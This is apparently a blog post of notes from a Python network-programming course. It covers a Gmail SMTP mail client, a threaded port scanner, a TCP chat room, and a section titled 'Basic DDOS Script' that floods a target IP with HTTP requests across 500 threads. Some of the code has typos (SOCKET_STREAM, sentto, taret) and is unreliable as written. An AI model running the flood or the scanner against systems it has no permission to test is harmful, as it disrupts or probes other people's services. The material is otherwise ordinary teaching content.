---
aliases:
- /Notes-on-Network-Programming-With-Python/
categories:
- python
- notes
date: '2021-12-30'
description: My notes from Neural Nine's video providing an introduction to network
  programming with python.
hide: false
layout: post
search_exclude: false
title: Notes on Network Programming With Python
toc: false

---

* [Overview](#overview)
* [Mail Client using Gmail](#mail-client-using-gmail)
* [Basic DDOS Script](#basic-ddos-script)
* [Basic Port Scanner](#basic-port-scanner)
* [TCP Chat Room Server](#tcp-chat-room-server)
* [TCP Chat Room Client](#tcp-chat-room-client)



## Overview

Here are some notes I took while watching Neural Nine's [video](https://www.youtube.com/watch?v=FGdiSJakIS4) providing an introduction to network programming with python.

Colab Notebook

[Google Colaboratory](https://colab.research.google.com/drive/1aZ22aE5BYxYDL_LwytHmXA5qHZx2xDbJ)



## Mail Client using Gmail

* Emails will be sent from an existing Gmail address 



**replit:** [https://replit.com/@innominate817/Mail-Client-Using-Gmail#main.py](https://replit.com/@innominate817/Mail-Client-Using-Gmail#main.py)



**Authenticating with Gmail**

* Need to tell Google to allow you to connect via SMTP

* SMTP is less secure as it requires having password in plain text

* Need to allow less secure apps to access your account ([link](https://myaccount.google.com/lesssecureapps?gar=1&pli=1&rapt=AEjHL4NcQ0S2VBB0jYWAjN-VkhCokGyARXedzFmhbzdw_3mUS5i2M_7zuL-iqjj7zQ1aiUYcK-a6RgjEClKaFcjS8WYAik6zYw))

* Need to create an app-specific password if 2-step verification is enabled ([link](https://myaccount.google.com/apppasswords?gar=1&rapt=AEjHL4OA-PrqavWjZVhvliOl1qO1WkefSmos3ET7dqME2zWwO_pVL_-gSVChoCVX8nM8bzz7FI8KbdH8Ln-fNv29fXDRD-CKhw))

* Might need to use the Display Unlock Captcha [link](https://accounts.google.com/DisplayUnlockCaptcha) before logging in

**Limitations using Gmail**

* Free accounts are limited to 500 emails per day
* Rate limited to about 20 emails per second

**Alternatives for Higher Usage**

* [AWS Simple Email Service](https://aws.amazon.com/ses/)
* [Sendgrid: delivery service](https://sendgrid.com/)



**Create SMTP Server**

**Import Dependencies**

* [**email:**](https://docs.python.org/3/library/email.html) an email and MIME handling package
* [**getpass:**](https://docs.python.org/3/library/getpass.html) prompt the user for a password without echoing it to the console
* [**smtplib:**](https://docs.python.org/3.9/library/smtplib.html) defines an SMTP client session object that can be used to send mail

```python
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

import getpass
import smtplib
```



**Get Sending Gmail Login Info**

```python
# Gmail account that will be sending emails
gmail_address = input("Enter an existing Gmail address: ")
gmail_password = getpass.getpass(f'Sender: {gmail_address}\nPassword: ')
```



**Get Destination Address**

```python
destination_address = input("Enter a destination email address: ")
```



**Create Multipart Multipurpose Internet Mail Extensions (Mime) Object**

**Email Structure**

```python
From: {}
To: {}
Subject: {}
{body}
```

```python
# Multipart Multipurpose Internet Mail Extensions (MIME) object
msg = MIMEMultipart()

# Add email header info 
msg['From'] = gmail_address
msg['To'] = destination_address
msg['Subject'] = 'Test Email Using Python'
```

**Create Body Text**

```python
# Create email body text content
body = 'This email was sent using Python.'
# or read body content from file
# with open('email_text.txt', 'r') as f:
#     body = f.read()

# Attach body text content
msg.attach(MIMEText(body, 'plain'))
```



**Attach an Image**

```python
# Image Name
filename = 'pexels-vitaliy-mitrofanenko-9737456.jpg'
# Image file path
filepath = f'./{filename}'
# Open image file in binary format
attachment = open(filepath, 'rb')

# Create a new MIME object
p = MIMEBase('application', 'octet-stream')
# Set image as payload for MIME object
p.set_payload((attachment.read()))
# Encode MIME object
encoders.encode_base64(p)
# Add new Header
p.add_header('Content-Disposition', f'attachement; filename={filename}')
# Attach MIME object to email message
msg.attach(p)
```



**Send the Email**

```python
try:
    # Instantiate SMTP connection to the Gmail server using SSL on port 465
    server = smtplib.SMTP_SSL('smtp.gmail.com',465)
    # Identify client to server
    server.ehlo()
    # Login
    server.login(gmail_address, gmail_password)
    # Send Email
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    # Close Server
    server.quit()
    print("Email Sent!")
except:
    print("Unable to connect")
```



**Additional Resources**

* Create an Email Using Markdown: [GitHub Gist](https://gist.github.com/cleverdevil/8250082)






## Basic DDOS Script

* Distributed Denial of Service

* ***Highly illegal when you do not have permission!!!***

* Python is not the ideal language for a real DDOS attack as it does not support true multithreading

* Rough script, not optimized



**Import Dependencies**

* [**socket:**](https://docs.python.org/3/library/socket.html) low-level networking interface
* [**threading:**](https://docs.python.org/3/library/threading.html) thread-based parrallelism

```python
import socket
import threading
```



**Set Target Information**

```python
# Target IP Address to attack
target = '192.168.1.1'
# Send traffic to HTTP port
port = 80
# Fake ip address for header
fake_ip = '192.168.1.123'
```



**Define DDOS Attack**

```python
def attack():
    while True:
        # Create a new TCP socket using IPv4 addresses
        s = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
        # Connect to that target IPv4 address on the target port
        s.connect((target, port))
        s.sentto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        # Send data to the socket
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
```



**Run DDOS Attack**

```python
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
```





## Basic Port Scanner

* Open ports are potential security vulnerabilities

* A port scanner can help detect open ports that are not needed so we can close them

* ***Port scanning is illegal without permission!!!***



**Import Dependencies**

* [**socket:**](https://docs.python.org/3/library/socket.html) low-level networking interface
* [**threading:**](https://docs.python.org/3/library/threading.html) thread-based parrallelism
* **[queue:](https://docs.python.org/3/library/queue.html)** a synchronized queue class

```python
import socket
import threading
from queue import Queue
```

**Set Target Address**

```python
target = '192.168.2.1'
```

**Check if a Port Is Open**

```python
def portscan(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        return True
    except:
        return False
```

**Define Target Function for Threads**

```python
# Stores list of open ports
open_ports = []

def worker():
    while not queue.empty():
        port = queue.get()
        if portscan(port):
            print(f"Port {port} is open!")
            open_ports.append(port)
```

**Store List of Target Ports in a Queue**

```python
queue = Queue()

for port in range(1, 1024):
    queue.put(port)
```

**Create a List of Threads**

```python
thread_list = [threading.Thread(target=worker) for i in range(10)]
```

**Start Threads**

```python
for thread in thread_list:
    thread.start()
```

**Wait Until Threads Terminate**

```python
for thread in thread_list:
    thread.join()
```

**Print List of Open Ports**

```python
print(f"Open ports are: {open_ports}")
```





## TCP Chat Room Server

**Import Dependencies**

* [**socket:**](https://docs.python.org/3/library/socket.html) low-level networking interface
* [**threading:**](https://docs.python.org/3/library/threading.html) thread-based parrallelism

```python
import socket
import threading
```

**Define Server Address and Port**

```python
# localhost
host = '127.0.0.1'
# Don't use port numbers below 10000
port = 55555
```

**Start Server**

```python
# Create a new TCP socket using IPv4 addresses
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind socket to the host address and port
server.bind((host, port))
# Put server in listening mode
server.listen()
```



```python
# List of current client socket objects
clients = []
# List of client user names
nicknames = []
```

**Send Message to All Clients**

```python
def broadcast(message):
    for client in clients:
        client.send(message)
```

**Handle Data From Clients**

```python
def handle(client):
    while True:
        try:
            # Try to receive message data from client
            message = client.recv(1024)
            # Broadcast client messages to all clients
            broadcast(message)
        except:
            # Remove disconnected clients
            index = clients.index(client)
            clients.remove(client)
            client.close()
            nickname = nicknames[index]
            # Inform all clients that the client has disconnected 
            broadcast(f'{nickname} left the chat!'.encode('ascii'))
            nicknames.remove(nickname)
            break
```

**Add New Clients**

```python
def receive():
    while True:
        # Accept a connection
        client, address = server.accept()
        print(f"Connected with {str(address)}")
        
        # Send data to the client socket
        # Prompt user for a nickname
        client.send('NICK'.encode('ascii'))
        # Receive data from socket
        nickname = client.recv(1024).decode('ascii')
        nicknames.append(nickname)
        clients.append(client)

        print(f"Nickname of the client is {nickname}!")
        broadcast(f"{nickname} has joined the chat!".encode('ascii'))
        client.send('Connected to the server'.encode('ascii'))
		
        # Start new thread to listen for messages from client
        thread = threading.Thread(taret=handle, args=(client,))
        thread.start()
```



## TCP Chat Room Client

**Import Dependencies**

* [**socket:**](https://docs.python.org/3/library/socket.html) low-level networking interface
* [**threading:**](https://docs.python.org/3/library/threading.html) thread-based parrallelism

```python
import socket
import threading
```

**Define Server Address and Port**

```python
# localhost
host = '127.0.0.1'
# Don't use port numbers below 10000
port = 55555
```

**Pick a Nickname**

```python
nickname = input("Enter a nickname: ")
```

**Initialize Client**

```python
# Create a new TCP socket using IPv4 addresses
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the server
client.connect((host, port))
```

**Handle Data Received From Server**

```python
def receive():
    while True:
        try:
            message = client.recv(1024).decode('ascii')
            if message == 'NICK':
                client.send(nickname.encode('ascii'))
            else:
                print(message)
        except:
            print("An error occurred!")
            client.close()
            break
```

**Send Data to Server**

```python
def write():
    while True:
        # Constantly prompt user for input
        message = f'{nickname}: {input("")}'
        client.send(message.encode('ascii'))
```

**Listen for Data Sent From Server**

```python
receive_thread = threading.Thread(target=receive)
receive_thread.start()
```

**Listen For User Input**

```python
write_thread = threading.Thread(target=write)
write_thread.start()
```




**References:**

* [Network Programming with Python Course (build a port scanner, mailing client, chat room, DDOS)](https://www.youtube.com/watch?v=FGdiSJakIS4)
* [How to Send Emails with Gmail using Python](https://stackabuse.com/how-to-send-emails-with-gmail-using-python/)





<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "56b8d2f624604c4891327b3c0d9f6703"}'></script><!-- End Cloudflare Web Analytics -->